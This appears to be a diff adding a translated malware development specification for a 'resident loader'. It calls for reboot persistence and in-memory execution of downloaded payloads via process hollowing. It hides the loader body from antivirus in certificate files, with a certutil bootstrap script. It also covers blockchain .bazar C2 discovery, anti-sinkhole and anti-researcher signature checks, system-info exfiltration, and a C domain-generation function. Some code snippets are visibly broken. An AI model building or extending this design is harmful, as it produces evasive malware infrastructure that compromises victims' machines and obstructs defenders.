@@ -1,0 +1,237 @@
+RESIDENT LOADER
+TERMS OF REFERENCE
+
+You need to develop a resident loader that meets these requirements:
+- small size (ideally not more than 100k)
+- Working on bare Windows OS starting from Windows 2008/Windows Vista
+which means using embedded scripting languages (js, powershell v2.0), or writing in C/C++ is acceptable
+- Working as a non-aligned user, without trying to elevate privileges and bypass UAC
+
+"Resident" means that the bootloader is anchored to the machine and survives machine restarts, starts after the machine restarts.
+It does NOT mean that the bootloader is constantly hanging in memory as a background process, waiting for something.
+All it has to do is survive a reboot.
+
+The anchoring function in the loader can be disabled at the stage of assembly, for specific environments and tasks.
+Then the anchoring of the loader can be taken by the bot itself (at command 18, see the appropriate protocol).
+To do this, the loader must pass the path to its own file to the bot at startup (through the command line or shared memory or something else).
+
+The task of the loader:
+- at the first startup on the machine, fix itself with one of the fixing techniques (add itself to the schedule, autoloader, shortcuts, etc., see below)
+- determine the bit depth of the processor, and auto-update to the correct bit depth
+- choose a link to download the main file, according to digit capacity
+- get encrypted file from server, decrypt it. The encryption is XOR of 1 byte, the key is the current UTC date in YYYYMMdd representation, written in hex
+For example 20200128 is a hex string 3230323030313238 (each digit is converted to 16-bit representation)
+It is important to get the time in UTC in order to use the correct date for machines in remote time zones
+- if communication or decoding fails, keep trying to retrieve and decrypt the load every hour
+- run the received file using fileless techniques - process hollowing, process doppelganging, loading and running dll from memory, or similar techniques,
+WITHOUT SAVING TO DISK, EVEN IN INTERMEDIATE FORM
+- after running the file will terminate
+
+UNDER NO CIRCUMSTANCES SHOULD A FILE DOWNLOADED FROM THE NETWORK BE WRITTEN TO DISK
+this is a fundamental condition.
+
+If you choose to implement a scripting language, you should take into account that the implementation of fileless launching techniques
+(process hollowing/process doppelganging) are most likely extremely difficult to implement.
+
+Regarding the design of the load as a .dll:
+- this avoids running an additional process, hence avoiding proactive detects as well.
+In this case, the entry point to the .dll is the DllMain(DLL_PROCESS_ATTACH) function
+
+The loader must support operation through a proxy, if it is specified in the settings of the operating system (inetcpl.cpl -> Connection -> Proxy settings).
+
+Additionally, the loader must be able to:
+- Resolve Emercoin blockchain .bazar domains and use them to find command and control servers
+- update itself. To update itself, it uses an additional link embedded in the code. You should update yourself only if the version is different (arbitrary string)
+(the server must give the version of the file to the HEAD /update HTTP/1.1 request in the X-Tag header)
+
+It is HIGHLY RECOMMENDED not to store your own body as an .exe file.
+The usual way to ensure persistence on a system is to run the .exe file through the autostart, scheduled tasks,
+WMI services, etc.
+However, it is preferable to make the following scheme:
+- The boot loader body is stored packed and encrypted in some kind of container:
+ .txt file, certificate file, picture, long registry key value, .cab file, etc.
+- so the real body is invisible to antiviruses
+- does not launch an .exe, but a bootstrap script (.bat-file) which unwraps and starts the boot loader body
+  and deletes the intermediate .exe after execution
+- bootstrap-script uses only available utilities in the "bare" operating system
+
+For example (very primitive and conventional, just to demonstrate a technique), bootstrap.bat:
+
+@echo off
+REM get the loader from the "certificate"
+certutil -decode file.crt file.exe
+REM launch loader
+file.exe
+REM wait for file to load and work out
+ping -n 300 127.0.0.1 > NUL
+REM remove loader, because it already worked and started the load.
+del /f /y file.exe
+
+The self-renewal procedure must take this scheme into account and correctly dump the new body into the obfuscated file.
+
+If the C/C++ language is used, you should prepare a CMake project to be able to rebuild the loader code with non-Microsoft compilers,
+e.g. mingw, clang.
+
+
+SERVER VALIDATION
+
+Server validation is done by getting the current server date and checking the digital signature of the string with the date by an asymmetric crypto-key, which is inserted into the loader.
+This is a defense against SinkHole attacks by redirecting traffic from bots to a dummy server.
+
+The HTTP header for ANY HTTP response must contain the date and time, for example:
+Date: YYYY-MM-dd HH:mm:ss
+
+* First option.
+The HTTP response must contain a Set-Cookie header: with the cookie name SID and a base64-encoded value.
+The value of the cookie is a digital signature of DATE (WITHOUT time!)
+
+* Second option.
+Search for digital signature occurs in ALL HTTP response headers.
+If header values match, the server is considered failed.
+This change is done to improve traffic masking (the server response includes false headers, which the client ignores,
+and the DPI systems are misled).
+
+If the signature does not match, or the date (without time) does not match the local one, look for another server.
+
+Server validation must be done on the first request to the server.
+After validation, the server is marked as reliable and further validation is not required.
+Validation should be repeated when the connection is reset and when the server address is changed.
+
+The validation code is attached.
+
+
+CUSTOMER VALIDATION
+
+To cut researchers off from the server and prevent new groups from leaking files, server-side client validation is used.
+
+1. Each HTTP request to the server includes a Date field and puts the current date and time
+2. A private key for asymmetric encryption is embedded into the loeder/bot. Key changes from group to group
+The loeder/bot should sign the date value (after the substring "Date: " beginning with the first significant character after a space), base64 wrap the obtained value
+and put it in any random header.
+You can Cookie, but not necessarily - you can also use headers with prefix X- and any non-unique name (i.e. the one already in common use).
+The encryption algorithm is the same as for checking the server signature.
+
+
+DETERMINING THE C&C SERVER ADDRESS BY DOMAIN
+
+The following strategies are used to detect the command server:
+1. a list of "raw" IP addresses
+2. hardcode list of domains that do not exist yet (backup) Emercoin
+3. domain name generation based on the current date (implying .bazar domain suffix)
+The algorithm in item 3 is composed so that the number of all possible domains is several thousand,
+so there are enough of them to cover the entire registration,
+At the same time, the resolver's search time is not too long (about a day or two).
+The algorithm is shown in the appendix.
+Search for an algorithm 3 should not make batches of no more than 5000 domains at a time.
+Then go to step 1.
+After the first failed cycle 1...3, you should increase the server search intervals to half an hour between points.
+
+When you connect to the server, you should validate it by the digital signature (see above).
+If the server is invalid, the search continues.
+
+If you cannot find a valid command server in 3 consecutive attempts, you should either terminate or remove yourself from the system
+(determined by the build settings).
+
+After the IP address is resolved from the Emercoin domain, the IP address must be converted by an XOR 254 operation for each octet.
+For example, 124.245.101.251 (obtained from DNS response) -> 130.11.155.5
+Since the DNS information is available to everyone, this protects against abuses of addresses taken from the DNS record.
+
+Script code ipxor.ps1 in PowerShell:
+$ip = read-host -prompt "Enter IP";
+write-host $ip;
+$newip = ';
+($ip.split('.') | foreach {
+    $octet = [byte] ( $_)
+    $octet = $octet -bxor 254;
+    $newip = -join($newip,'.',$octet);
+}
+)
+write-host $newip;
+
+
+BOOT PROTOCOL
+
+HEAD / HTTP/1.1
+Checking for updates
+In the response we are looking for the X-Tag header, which contains an arbitrary string, indicating the version of the loader on the server.
+The update occurs if the version embedded in the loader does not match the version on the server.
+
+GET / HTTP/1.1
+
+Get the body of the load and run it.
+Encryption - 1 byte XOR, key - current UTC date in YYYYMMdd representation, written in hex
+e.g. 20200128 is a hex string 3230323030313238 (each digit is converted into 16 hex representation)
+
+POST / HTTP/1.1
+
+Same as GET, plus sending system information.
+The body of the request must be encrypted with a date as described above.
+
+THIS FUNCTION IS OPTIONAL. INCLUSION IN THE ASSEMBLY BY CONDITIONAL COMPILATION!
+
+The formatting of the response in the POST body corresponds to the same response of the backdoor.
+If some information can't be obtained without running external utilities, we don't send it! this is an important condition.
+The list of fields is shortened:
+path=full path to binary backdoor file (if not using completely fileless technology)
+os=3-7 digits containing major-version, minor-version and build of the operating system, if the system has any
+(e.g. for 6.1 build 7600 this will be 617600).
+os[1]=indicator of the OS type (W=Windows) and version
+os[2]=build OS
+arch=architecture: 86 or 64
+cname=computer name
+uname=user name
+domain=domain or workgroup name of the computer ONLY by calling WinAPI, for example NetWkstaGetInfo; no running external utilities!)
+av[]=tivirus type
+ps=process list
+
+
+ADDITIONAL
+
+Securing Techniques: https://habr.com/ru/post/425177/
+The Emercoin Resolve Code is attached.
+
+APPENDIX 1
+DOMAIN GENERATION CODE BY CURRENT DATE
+
+The code should be further obfuscated, both to confuse the analyst and because it gives a distinctive signature.
+This implies the domain suffixes .bazar
+
+void get_possible_domain(char* domain) {
+    if (!domain)
+        return;
+
+    for (int i = 0; i < 6; ++i) {
+        int rndchr = rand() % ('z' - 'a');
+        rndchr /= i + 6;
+        char c = 'a' + rndchr + i*2;
+        char[i] = c;
+    }
+
+    static char datebuf[24];
+    static char date[7];
+    static bool date_computed = false;
+
+    if (!date_computed) {
+        GetDateFormatA(LOCALE_INVARIANT, 0, NULL, NULL, datebuf, sizeof(datebuf));
+        char mon[3];
+        char year[5];
+
+        for (int i = 0; i < 2; ++i)
+            mon[i] = datebuf[i];
+        mon[2] = 0;
+
+        for (int i = 0; i < 4; ++i)
+            year[i] = datebuf[i + 6];
+        year[4] = 0;
+        sprintf_s(date, sizeof(date), "%.2d%d", 12 - atoi(mon), atoi(year) - 18);
+        date_computed = true;
+    }
+
+    for (int i = 6; i < 12; ++i) {
+        domain[i] = domain[i - 6] + date[i - 6] - '0';
+        if (domain[i] < 'a')
+            domain[i] = 'z';
+    }
+
+    domain[12] = 0;
+}
